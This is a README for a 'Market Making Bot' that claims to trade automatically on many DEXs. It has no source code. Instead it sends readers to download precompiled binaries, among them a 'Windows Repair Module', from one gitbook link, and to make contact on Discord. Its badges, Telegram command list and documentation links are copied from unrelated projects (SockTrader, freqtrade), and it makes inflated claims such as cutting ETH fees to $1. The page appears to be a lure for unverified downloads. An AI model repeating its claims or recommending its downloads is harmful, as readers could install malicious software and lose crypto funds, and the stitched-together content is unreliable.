<p align="center"><img width="720" height="463" src="images/int.jpg" alt="Defi Bot interface" /></p>

<p align="center"><img width="160" height="160" src="images/bitcoin.png" alt="Defi Bot logo" /></p>

<h1 align="center">Market Making Bot v3.1</h1>
<p align="center"><b>Market Making Bot</b></p>

<p align="center">
  <a href="https://www.gnu.org/licenses/gpl-3.0"><img src="https://img.shields.io/badge/License-GPL%20v3-blue.svg" alt="License: GPL v3"></a>
  <a href="https://codecov.io/gh/SockTrader/SockTrader"><img src="https://codecov.io/gh/SockTrader/SockTrader/branch/master/graph/badge.svg" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=reliability_rating" /></a>
  <a href="https://sonarcloud.io/dashboard?id=SockTrader_SockTrader"><img src="https://sonarcloud.io/api/project_badges/measure?project=SockTrader_SockTrader&metric=sqale_rating" /></a>
  <a href="https://circleci.com/gh/SockTrader"><img src="https://circleci.com/gh/SockTrader/SockTrader/tree/master.svg?style=shield" alt="Build status"></a>
  <a href="https://codeclimate.com/github/SockTrader/SockTrader/maintainability"><img src="https://api.codeclimate.com/v1/badges/19589f9237d31ca9dcf6/maintainability" /></a>
</p>

<p align="center"><b>Join the community <a href="t.me/seleniumdefitrade"><img valign="middle" src="https://img.shields.io/badge/Slack-4A154B?style=for-the-badge&logo=slack" alt="Telegram"></a></b></p>


> Work on MAC OS & Windows

> The bot works on multiple DEXs such as PancakeSwap, Uniswap, Sushiswap, Raydium, Serum and more 

## Download

In order to get full information through your Telegram bot and manage trading through your phone, we have left instructions on how to do it in the app launcher.

1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)

2: Install Actual Precompile Release x32 / x64 👇

Windows x64: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows x32: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows MSI Package: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Windows Repair Module: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Mac OS: [ ```Download``` ](https://sts-defi-bot.gitbook.io/selenium-bot/basics/download-link)

Contact me on Discord: ```taaafeth```

All Contact, which is linked at the very bottom of the repository.

## Introduction

Market Making Bot is a program that automatically places buy and sell orders on cryptocurrency exchanges, creating liquidity and allowing other market participants to trade.

# Market Making Bot Whitepaper

## Key Features
- 🦾 Create Wallets.
- 🚀 Realtime super-fast websocket trading.
- 📈 50+ Technical indicators. ([docs](https://github.com/anandanand84/technicalindicators))
- 🌈 Written in .NET and Python!
- 🌿 Unit tested source code.
- 📝 Paper trading a strategy on LIVE exchange data.
- 🏡 Use existing Wallets.
- 🚢 Funds all your wallets: Effortlessly transfer funds from the main wallet to all other connected wallets.
- 🔍 Fund your main wallet: Consolidate funds from all other wallets into your main wallet for centralized management.
- 📈 Trigger on time (seconds): Set automated buy and/or sell triggers to execute transactions at specific time intervals.
- 🔇 Triggers on price.
- 🔋 Triggers on Gas Price: Trade only if gas price is less than your settings.
- 💎 Dynamic Allocations on Buy: Use a certain percentage of the amount of main coin in the wallet for your buy transactions.
- 🛠 Dynamic Allocations on Sell: Use a certain percentage of the amount of your selected coin in the wallet for your sell transactions.
- 🔑 Randomize the amount to buy.
- 🍔 Liquidity Farms. Minimize fees within any network by calculating the recent blocks farmed to indicate the lowest fee to the miner. This way you will be able to reduce the fee when farming in the ETH network to $1.
- 💸 Trade with any wallet.
- 🤖 Auto GWEI.
- 🧿 Live trading data: Access real-time trading data, including the number of buys, sells, volumes, and percentage of variation over different time intervals (5 minutes, 1 hour, 6 hours, 24 hours).
- ⚖️ Force Buy and Sell.
- 🔫Triggers on Volumes: Trade only if the volume in the past 24 hours, 6 hours, or 1 hour is above or below a specific threshold.

### Intuitive Interface

User-friendly interface that doesn't require in-depth knowledge of DeFi.

[See our interface in action](Soon)

### Automated Strategies

Optimize your assets with automated strategies that maximize returns without manual intervention.

### Personalized Recommendations

Get recommendations based on your individual goals and portfolio to help you make informed decisions.


### Support for Leading Cryptocurrencies

Support for a wide range of cryptocurrencies ensures portfolio diversification and minimizes risk.

[Explore our supported cryptocurrencies](https://sts-defi-bot.gitbook.io/~gitbook/image?url=https%3A%2F%2F1784350065-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FzaFWYawnXeaMS1zJDrEO%252Fuploads%252Fbh4gHENLd94ELNz6is6o%252FFINA.png%3Falt%3Dmedia%26token%3Dc7f28c98-00f2-4039-9792-0916d4cc0cda&width=768&dpr=1&quality=100&sign=30ad1a38a7b09748b785bbb0940fa55d0ca9e3747d553b7ec2a63e2b21a5d25e))

### Telegram RPC commands

Telegram is not mandatory. However, this is a great way to control your bot. More details and the full command list on the [documentation](https://www.freqtrade.io/en/latest/telegram-usage/)

- `/start`: Starts the trader.
- `/stop`: Stops the trader.
- `/stopentry`: Stop entering new trades.
- `/status <trade_id>|[table]`: Lists all or specific open trades.
- `/profit [<n>]`: Lists cumulative profit from all finished trades, over the last n days.
- `/forceexit <trade_id>|all`: Instantly exits the given trade (Ignoring `minimum_roi`).
- `/fx <trade_id>|all`: Alias to `/forceexit`
- `/performance`: Show performance of each finished trade grouped by pair
- `/balance`: Show account balance per currency.
- `/daily <n>`: Shows profit or loss per day, over the last n days.
- `/help`: Show help message.
- `/version`: Show version.

## Development branches

The project is currently setup in two main branches:

- `develop` - This branch has often new features, but might also contain breaking changes. We try hard to keep this branch as stable as possible.
- `stable` - This branch contains the latest stable release. This branch is generally well tested.
- `feat/*` - These are feature branches, which are being worked on heavily. Please don't use these unless you want to test a specific feature.

## Support

### Help / Discord

## DEXs the Market Making Bot Integrates With
'uniswap'
'shibaswap'
'pancakeswap'
'sushiswapbsc'
'pancakeswaptestnet'
'traderjoe'
'sushiswapavax'
'pangolin'
'pinkswap'
'biswap'
'orbitalswap'
'pulsextestnet'
'babyswap'
'tethys'
'bakeryswap'
'apeswap'
'sushiswapeth'
'turtleswap'
'sushiswaparbitrum'
'degenswap'
'trisolaris'
'solarbeam'
'stellaswap'
'uniswaptestnet'
'kuswap'
'mojitoswap'
'koffeeswap'
'dogeswap'
'yodeswap'
'fraxswap'
'quickswap_dogechain'
'hebeswap'
'spookyswap'
'tombswap'
'wagyuswap'
'klayswap'
'sushiswapftm'
'protofi'
'spiritswap'
'quickswap'
'matic-meerkat'
'tetuswap'
'sushiswapmatic'
'polygon-apeswap'
'waultswap'
'cronos-vvs'
'cronos-meerkat'
'cronos-crona'
'viperswap'
'milkyswap'
'pangolin'
'serum'
'baseswap'
'uniswapv2-base'
'sushiswaparbitrum'
'shibaswap'
'raydium'

## Networks Market Making Bot works with

'Ethereum'
'EVM'
'PoW'
'THORChain'
'Elk Finance'
'Layer-2'
'Terra'
'BSC'
'Solana'
